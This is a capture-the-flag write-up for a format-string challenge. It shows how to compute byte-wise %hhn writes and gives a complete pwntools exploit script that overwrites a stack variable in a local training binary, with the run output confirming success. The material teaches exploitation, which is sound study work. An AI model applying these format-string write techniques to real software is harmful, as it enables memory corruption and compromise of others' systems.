# 11_format_var_targetOverwrite Writeup

## Steps:
1. Run chall. This is very similar to 10 but we want to set the target variable to a sepecific value now.
```
$ ./chall 

Your goal is to modify the variable @ 0x7ffddba01118 to equal 0xbeefc0de

This exercises is similar to the previous. You will notice a canary, but shouldn't have to worry about it!

0x7ffddba01090: 0x0000000000000000 0x0000000000000000 
0x7ffddba010a0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010b0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010c0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010d0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010e0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010f0: 0x0000000000000000 0x0000000000000000 
0x7ffddba01100: 0x0000000000000000 0x0000000000000000 
0x7ffddba01110: 0xffffffffffffffff 0x00000000deadbeef 

Enter input: AAAA
AAAA

0x7ffddba01090: 0x0000000a41414141 0x0000000000000000 
0x7ffddba010a0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010b0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010c0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010d0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010e0: 0x0000000000000000 0x0000000000000000 
0x7ffddba010f0: 0x0000000000000000 0x0000000000000000 
0x7ffddba01100: 0x0000000000000000 0x0000000000000000 
0x7ffddba01110: 0xffffffffffffffff 0x00000000deadbeef 

You failed to modify the target variable...
```
2. Split `0xbeefc0de` into its individual bytes and write them least significant to most significant.
   To do this, we take into account the number of characters already written to calculate how many more to have the target number printed.

   If the previous value > current value, add a 1 in front of the current value. %_hhn only writes 1 byte so the extra will be ignored.
- 1st: `0xde = 222`
- 2nd: `0x1c0 - 0xde = 226`
- 3rd: `0xef - 0xc0 = 47`
- 4th: `0x1be - 0xef = 207`
4. Write the payload outline 
- `%222c%__$lln` --> lln writes 8 bytes, effectively writing 0xde and setting other bytes to 0s
- `%226c%__$hhn` --> hhn writes the rest 1 byte at a time
- `%47c%__$hhn`
- `%207c%__hhn`
The lengths of the instructions are `12 + 12 + 11 + 12 = 47`.
Thus we need 1 byte of padding to write the addresses in their own 8-byte values, putting the addresses starting at 12 because the instructions fill stack 5-11 since `48/8 = 6` and `5+6 = 11`.
5. Finish the payload with the addresses and fill in the stack locations. Since each value is 1 byte, increment the address by 1 each time.
```
from pwn import *

target = process('./chall')

target.recvuntil(b"variable @ ")
addr = target.recvuntil(b" ")[:-1].strip().decode()
addr = int(addr, 16)
log.info(hex(addr))


payload = b"%222c%12$lln"
payload += b"%226c%13$hhn"
payload += b"%47c%14$hhn"
payload += b"%207c%15$hhn"
payload += b"A"
payload += p64(addr)+p64(addr+1)+p64(addr+2)+p64(addr+3)

target.sendline(payload)

s = target.recvall().decode('latin-1')
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 83310
[*] 0x7ffdf5aaff08
[+] Receiving all data: Done (2.19KB)
[*] Process './chall' stopped with exit code 0 (pid 83310)
to equal 0xbeefc0de

This exercises is similar to the previous. You will notice a canary, but shouldn't have to worry about it!

0x7ffdf5aafe80: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafe90: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafea0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafeb0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafec0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafed0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafee0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafef0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aaff00: 0xffffffffffffffff 0x00000000deadbeef 

Enter input:                                                                                                                                                                                                                                                                                                                                                                                                                                                               Q                                              \x08                                                                                                                                                                                                              \x00A\x08ÿªõý\x7f
0x7ffdf5aafe80: 0x3231256332323225 0x363232256e6c6c24 
0x7ffdf5aafe90: 0x6e68682433312563 0x2434312563373425 
0x7ffdf5aafea0: 0x63373032256e6868 0x416e686824353125 
0x7ffdf5aafeb0: 0x00007ffdf5aaff08 0x00007ffdf5aaff09 
0x7ffdf5aafec0: 0x00007ffdf5aaff0a 0x00007ffdf5aaff0b 
0x7ffdf5aafed0: 0x000000000000000a 0x0000000000000000 
0x7ffdf5aafee0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aafef0: 0x0000000000000000 0x0000000000000000 
0x7ffdf5aaff00: 0xffffffffffffffff 0x00000000beefc0de 

Congrats! You modified the target variable!
```
          
